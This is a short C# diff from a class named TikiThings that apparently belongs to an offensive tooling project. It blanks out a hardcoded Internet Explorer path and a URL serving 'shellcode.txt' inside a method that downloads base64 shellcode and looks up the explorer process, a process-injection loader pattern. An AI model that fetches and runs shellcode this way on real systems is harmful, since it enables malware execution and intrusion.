@@ -43,8 +43,8 @@ public class TikiThings
 
     public static void Flame()
     {
-        string binary = @"C:\\Program Files\\Internet Explorer\\iexplore.exe";
-        string url = @"http://nickelviper.co.uk/shellcode.txt";
+        string binary = @"";
+        string url = @"";
 
         byte[] shellcode = Convert.FromBase64String(GetData(url));
         int ppid = FindProcessPid("explorer");
